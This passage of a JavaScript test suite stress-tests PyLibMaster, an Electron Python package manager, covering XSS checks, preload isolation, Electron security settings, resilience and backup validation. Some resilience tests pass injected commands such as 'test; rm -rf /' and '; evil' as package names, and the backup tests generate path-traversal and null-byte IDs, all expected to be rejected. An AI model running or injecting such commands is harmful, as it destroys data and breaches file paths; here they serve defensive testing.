      for (const f of files) assert.ok(fs.existsSync(path.join(jsDir, f)), `缺: ${f}`);
      record('前端-模块', '7文件完整', 'pass');
    });

    it('index.html 正确加载顺序', () => {
      const html = fs.readFileSync(path.join(__dirname, '..', '..', 'renderer', 'index.html'), 'utf-8');
      const scripts = [...html.matchAll(/src="js\/(\w+\.js)"/g)].map(m => m[1]);
      assert.ok(scripts.length >= 7, `只加载${scripts.length}个`);
      assert.ok(scripts.indexOf('i18n.js') < scripts.indexOf('app.js'));
      assert.ok(scripts.indexOf('core.js') < scripts.indexOf('app.js'));
      record('前端-模块', '加载顺序', 'pass', `${scripts.length}个脚本`);
    });
  });

  describe('10.2 XSS防护', () => {
    it('escapeHtml 函数存在', () => {
      assert.ok(contents['core.js'].includes('escapeHtml'));
      record('前端-XSS', 'escapeHtml存在', 'pass');
    });

    it('无 eval/Function 使用', () => {
      assert.ok(!allJs.includes('eval('), '使用了eval!');
      assert.ok(!allJs.includes('new Function('), '使用了Function构造器!');
      record('前端-XSS', '无eval/Function', 'pass');
    });

    it('无 document.write 使用', () => {
      assert.ok(!allJs.includes('document.write'), '使用了document.write!');
      record('前端-XSS', '无document.write', 'pass');
    });
  });

  describe('10.3 事件与DOM', () => {
    it('Toast 自动移除', () => {
      assert.ok(contents['core.js'].includes('setTimeout') && contents['core.js'].includes('.remove()'));
      record('前端-DOM', 'Toast自动清理', 'pass');
    });

    it('表格批量渲染', () => {
      assert.ok(allJs.includes(".join('')") || allJs.includes('.join("")'));
      record('前端-DOM', '批量渲染', 'pass');
    });
  });

  describe('10.4 i18n 完整性', () => {
    it('中英文key一致', () => {
      const i18n = contents['i18n.js'];
      const zhMatch = i18n.match(/zh:\s*\{([\s\S]*?)\},\s*\/\/ 英文/);
      const enMatch = i18n.match(/en:\s*\{([\s\S]*?)\}\s*\}/);
      if (!zhMatch || !enMatch) { record('前端-i18n', '解析', 'warning', '无法解析'); return; }
      const zhKeys = [...zhMatch[1].matchAll(/'([^']+)'\s*:/g)].map(m => m[1]);
      const enKeys = [...enMatch[1].matchAll(/'([^']+)'\s*:/g)].map(m => m[1]);
      const missEn = zhKeys.filter(k => !enKeys.includes(k));
      const missZh = enKeys.filter(k => !zhKeys.includes(k));
      assert.strictEqual(missEn.length, 0, `英缺: ${missEn.join(',')}`);
      assert.strictEqual(missZh.length, 0, `中缺: ${missZh.join(',')}`);
      record('前端-i18n', 'key一致', 'pass', `${zhKeys.length}个`);
    });
  });
});

// ===========================
// 11. Preload 安全桥接层
// ===========================
describe('🌉 Preload 安全桥接层', () => {

  const preload = fs.readFileSync(path.join(__dirname, '..', '..', 'preload.js'), 'utf-8');

  it('使用 contextBridge', () => {
    assert.ok(preload.includes('contextBridge.exposeInMainWorld'));
    record('Preload', 'contextBridge', 'pass');
  });

  it('不直接暴露 ipcRenderer', () => {
    assert.ok(!/module\.exports\s*=.*ipcRenderer/.test(preload));
    record('Preload', 'ipcRenderer隔离', 'pass');
  });

  it('无 fs/child_process 引入', () => {
    assert.ok(!preload.includes("require('fs')"));
    assert.ok(!preload.includes("require('child_process')"));
    record('Preload', '无危险模块', 'pass');
  });

  it('invoke通道>20个', () => {
    const count = (preload.match(/ipcRenderer\.invoke/g) || []).length;
    assert.ok(count > 20, `invoke通道: ${count}`);
    record('Preload', `invoke通道(${count})`, 'pass');
  });

  it('进度事件有清理', () => {
    assert.ok(preload.includes('onProgress'));
    assert.ok(preload.includes('removeAllListeners'));
    record('Preload', '事件清理', 'pass');
  });
});

// ===========================
// 12. 架构与代码质量
// ===========================
describe('🏗️ 架构与代码质量', () => {

  describe('12.1 错误处理覆盖', () => {
    it('所有核心模块有try-catch', () => {
      const modules = ['pipManager.js', 'mirrorManager.js', 'envManager.js', 'backupManager.js', 'configManager.js', 'logManager.js', 'venvManager.js', 'templateManager.js', 'schedulerManager.js', 'auditManager.js'];
      for (const mod of modules) {
        const src = fs.readFileSync(path.join(__dirname, '..', '..', 'core', mod), 'utf-8');
        assert.ok(src.includes('try') && src.includes('catch'), `${mod}缺try-catch`);
      }
      record('架构-错误', '10模块try-catch', 'pass');
    });
  });

  describe('12.2 Electron安全配置', () => {
    const mainSrc = fs.readFileSync(path.join(__dirname, '..', '..', 'main.js'), 'utf-8');

    it('contextIsolation: true', () => {
      assert.ok(mainSrc.includes('contextIsolation: true'));
      record('架构-安全', 'contextIsolation', 'pass');
    });

    it('nodeIntegration: false', () => {
      assert.ok(mainSrc.includes('nodeIntegration: false'));
      record('架构-安全', 'nodeIntegration禁用', 'pass');
    });

    it('setWindowOpenHandler 拒绝新窗口', () => {
      assert.ok(mainSrc.includes('setWindowOpenHandler'));
      assert.ok(mainSrc.includes("action: 'deny'"));
      record('架构-安全', '窗口打开控制', 'pass');
    });

    it('before-quit 进程清理', () => {
      assert.ok(mainSrc.includes('before-quit'));
      assert.ok(mainSrc.includes('cancelAllProcesses'));
      record('架构-安全', '退出清理', 'pass');
    });
  });

  describe('12.3 processRunner 安全机制', () => {
    const src = fs.readFileSync(path.join(__dirname, '..', '..', 'utils', 'processRunner.js'), 'utf-8');

    it('超时+SIGTERM+SIGKILL', () => {
      assert.ok(src.includes('timeout'));
      assert.ok(src.includes('SIGTERM') || src.includes('SIGKILL'));
      assert.ok(src.includes('SIGKILL_DELAY') || src.includes('SIGKILL'));
      record('进程-安全', '超时+终止', 'pass');
    });

    it('活跃进程跟踪', () => {
      assert.ok(src.includes('activeProcesses'));
      record('进程-安全', '进程跟踪', 'pass');
    });

    it('operationId 取消支持', () => {
      assert.ok(src.includes('operationId'));
      record('进程-安全', 'operationId', 'pass');
    });

    it('windowsHide + ANSI清理', () => {
      assert.ok(src.includes('windowsHide'));
      assert.ok(src.includes('stripAnsi') || src.includes('strip-ansi'));
      record('进程-安全', 'windowsHide+ANSI', 'pass');
    });
  });
});

// ===========================
// 13. 事件循环与CPU压力
// ===========================
describe('⏱️ 事件循环与CPU压力', () => {

  it('事件循环延迟<100ms', async () => {
    let maxDelay = 0;
    for (let i = 0; i < 300; i++) {
      const start = Date.now();
      await new Promise(r => setImmediate(r));
      maxDelay = Math.max(maxDelay, Date.now() - start);
    }
    assert.ok(maxDelay < 100, `延迟: ${maxDelay}ms`);
    record('事件循环', '最大延迟(300次)', maxDelay < 20 ? 'pass' : 'warning', `${maxDelay}ms`);
  });

  it('CPU密集: 10K次JSON+正则', () => {
    const start = Date.now();
    for (let i = 0; i < 10000; i++) {
      JSON.stringify({ data: 'x'.repeat(200), n: i, arr: [1, 2, 3] });
      /^[a-zA-Z0-9._-]+$/.test(`package-${i}`);
    }
    const elapsed = Date.now() - start;
    assert.ok(elapsed < 3000, `CPU超时: ${elapsed}ms`);
    record('CPU', '10K次JSON+正则', elapsed < 500 ? 'pass' : 'warning', `${elapsed}ms`);
  });

  it('2000个Promise并发', async () => {
    const start = Date.now();
    const promises = [];
    for (let i = 0; i < 2000; i++) {
      promises.push(Promise.resolve().then(() => { let s = 0; for (let j = 0; j < 50; j++) s += j; return s; }));
    }
    const r = await Promise.all(promises);
    const elapsed = Date.now() - start;
    assert.strictEqual(r.length, 2000);
    assert.ok(elapsed < 3000, `Promise超时: ${elapsed}ms`);
    record('CPU', '2000Promise', elapsed < 500 ? 'pass' : 'warning', `${elapsed}ms`);
  });
});

// ===========================
// 14. 错误恢复与韧性
// ===========================
describe('🛡️ 错误恢复与韧性', () => {

  it('配置异常值处理', () => {
    configManager.setConfig('_null', null);
    configManager.setConfig('_undef', undefined);
    configManager.setConfig('_obj', { deep: { nested: true } });
    configManager.setConfig('_arr', [1, 2, 3]);
    configManager.setConfig('_long', 'x'.repeat(100000));
    const cfg = configManager.getConfig();
    assert.ok(cfg);
    assert.strictEqual(cfg._null, null);
    assert.deepStrictEqual(cfg._obj, { deep: { nested: true } });
    record('韧性-配置', '异常值', 'pass');
  });

  it('日志异常输入', () => {
    logManager.addLog({ action: null, status: null, type: null });
    logManager.addLog({});
    logManager.addLog({ action: 'x'.repeat(10000), status: 'ok', type: 'sys', detail: 'y'.repeat(10000) });
    const logs = logManager.getLogs();
    assert.ok(Array.isArray(logs) && logs.length > 0);
    record('韧性-日志', '异常输入', 'pass');
  });

  it('镜像无效输入', () => {
    try { mirrorManager.addCustomMirror('X', ''); } catch {}
    try { mirrorManager.addCustomMirror('', 'https://v.com/s/'); } catch {}
    const mirrors = mirrorManager.getMirrors();
    assert.ok(Array.isArray(mirrors) && mirrors.length > 0);
    record('韧性-镜像', '无效输入', 'pass');
  });

  it('环境切换不存在路径', () => {
    assert.throws(() => envManager.switchEnvironment('C:\\nonexistent\\python.exe'));
    record('韧性-环境', '不存在路径', 'pass');
  });

  it('搜索空/超长/特殊字符', async () => {
    const { searchPackage } = require('../../core/pipManager');
    await assert.rejects(() => searchPackage(''));
    await assert.rejects(() => searchPackage('a'.repeat(201)));
    await assert.rejects(() => searchPackage('test; rm -rf /'));
    record('韧性-搜索', '异常输入', 'pass');
  });

  it('安装空数组/null/非法包名', async () => {
    const { installPackages } = require('../../core/pipManager');
    await assert.rejects(() => installPackages([]));
    await assert.rejects(() => installPackages(null));
    await assert.rejects(() => installPackages(['ok', '; evil']));
    record('韧性-安装', '异常输入', 'pass');
  });
});

// ===========================
// 15. 跨模块集成压力
// ===========================
describe('🔗 跨模块集成压力', () => {

  it('全模块API导出完整性', () => {
    const checks = [
      ['../../core/pipManager', ['buildPackageSpec', 'installPackages', 'searchPackage', 'listInstalled', 'listOutdated', 'updatePackages', 'uninstallPackages']],
      ['../../core/envManager', ['detectEnvironments', 'getCurrent', 'switchEnvironment']],
      ['../../core/backupManager', ['createBackup', 'listBackups', 'restoreBackup', 'deleteBackup', 'validateBackupId']],
      ['../../core/configManager', ['getConfig', 'setConfig', 'setBulk', 'getStoragePath']],
      ['../../core/logManager', ['addLog', 'getLogs', 'clearLogs']],
      ['../../core/mirrorManager', ['getMirrors', 'getDefaultMirror', 'setDefaultMirror', 'addCustomMirror', 'restoreDefaultMirrors', 'buildMirrorArgs']],
      ['../../core/venvManager', ['createVenv', 'listVenvs', 'deleteVenv', 'getVenvInfo']],
      ['../../core/templateManager', ['getTemplates', 'addCustomTemplate', 'removeCustomTemplate', 'createSnapshot', 'listSnapshots']],
      ['../../core/schedulerManager', ['getSchedulerConfig', 'saveSchedulerConfig', 'startScheduler', 'stopScheduler', 'getStatus']],
      ['../../core/auditManager', ['runAudit', 'getCachedResult', 'clearCache']],
      ['../../utils/security', ['isAllowedOpenPath']],
    ];
    for (const [mod, fns] of checks) {
      const exports = Object.keys(require(mod));
      for (const fn of fns) {
        assert.ok(exports.includes(fn), `${mod} 缺 ${fn}`);
      }
    }
    record('集成-API', '11模块导出完整', 'pass', `${checks.length}个模块`);
  });

  it('模块间无循环依赖崩溃', () => {
    // 如果能走到这里，说明所有模块加载无循环依赖问题
    assert.ok(true);
    record('集成-依赖', '无循环依赖', 'pass');
  });

  it('配置→镜像→日志 联动', () => {
    mirrorManager.restoreDefaultMirrors();
    mirrorManager.addCustomMirror('Integration', 'https://int.test.com/simple/');
    logManager.addLog({ action: 'Integration test', status: 'ok', type: 'system' });
    const mirrors = mirrorManager.getMirrors();
    assert.ok(mirrors.find(m => m.name === 'Integration'));
    const logs = logManager.getLogs();
    assert.ok(logs.find(l => l.action === 'Integration test'));
    mirrorManager.restoreDefaultMirrors();
    record('集成-联动', '配置→镜像→日志', 'pass');
  });

  it('调度→配置 持久化联动', () => {
    schedulerManager.saveSchedulerConfig({ enabled: true, frequency: 'weekly', whitelist: ['torch'] });
    const cfg = configManager.getConfig();
    assert.strictEqual(cfg.schedulerEnabled, true);
    assert.strictEqual(cfg.schedulerFrequency, 'weekly');
    schedulerManager.saveSchedulerConfig({ enabled: false, frequency: 'daily', whitelist: [] });
    record('集成-联动', '调度→配置', 'pass');
  });
});

// ===========================
// 16. 备份系统深度压力
// ===========================
describe('💿 备份系统深度压力', () => {

  it('2000个合法ID验证', () => {
    const start = Date.now();
    for (let i = 0; i < 2000; i++) {
      const id = `backup_Python311_2026-08-01T${String(i % 24).padStart(2, '0')}-${String(i % 60).padStart(2, '0')}-${String(i % 60).padStart(2, '0')}.txt`;
      assert.ok(validateBackupId(id));
    }
    const elapsed = Date.now() - start;
    assert.ok(elapsed < 5000, `超时: ${elapsed}ms`);
    record('备份-压力', '2000合法ID', 'pass', `${elapsed}ms`);
  });

  it('200个恶意ID全拦截', () => {
    const attacks = [];
    for (let i = 0; i < 100; i++) attacks.push(`../${'../'.repeat(i % 5)}evil${i}.txt`);
    for (let i = 0; i < 50; i++) attacks.push(`backup_\x00${i}.txt`);
    for (let i = 0; i < 50; i++) attacks.push(`backup_${'\\'.repeat(i % 3)}..${i}.txt`);
    let blocked = 0;
    for (const a of attacks) { try { validateBackupId(a); } catch { blocked++; } }
    assert.strictEqual(blocked, attacks.length, `只拦截${blocked}/${attacks.length}`);
    record('备份-压力', '200恶意ID', 'pass');
  });
});

// ===========================
// 测试报告
// ===========================
describe('📊 测试报告', () => {
  it('输出报告', () => {
    console.log('\n' + '═'.repeat(64));
    console.log('  PyLibMaster v1.5.23 全方位压力测试报告 (v5)');
    console.log('═'.repeat(64));
    console.log(`\n  总计: ${results.total} 项`);
    console.log(`  ✅ 通过: ${results.passed}`);
    console.log(`  ❌ 失败: ${results.failed}`);
    console.log(`  ⚠️  警告: ${results.warnings}`);
    console.log(`  通过率: ${((results.passed / results.total) * 100).toFixed(1)}%`);
    console.log(`  堆内存: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1)} MB`);
    console.log('\n' + '─'.repeat(64));

    for (const [section, items] of Object.entries(results.sections)) {
      const fails = items.filter(i => i.status === 'fail');
      const icon = fails.length > 0 ? '❌' : '✅';
      console.log(`\n  ${icon} ${section} (${items.length}项)`);
      for (const item of items) {
        if (item.status !== 'pass') {
          const i = item.status === 'fail' ? '❌' : '⚠️';
          console.log(`    ${i} ${item.name}${item.detail ? ` (${item.detail})` : ''}`);
        }
      }
    }

    console.log('\n' + '═'.repeat(64));
    const grade = results.failed === 0 ? (results.warnings <= 3 ? 'A+' : 'A') : (results.failed <= 2 ? 'B' : 'C');
    console.log(`  综合评级: ${grade}`);
    console.log('═'.repeat(64) + '\n');

    // 保存JSON报告
    const reportPath = path.join(__dirname, '..', '..', 'docs', 'stress-test-v5-report.json');
    fs.writeFileSync(reportPath, JSON.stringify({
      version: '1.5.23',
      testVersion: 'v5',
      timestamp: new Date().toISOString(),
      node: process.version,
      platform: `${process.platform} ${process.arch}`,
      summary: { total: results.total, passed: results.passed, failed: results.failed, warnings: results.warnings },
      grade,
      sections: results.sections
    }, null, 2), 'utf-8');
  });
});
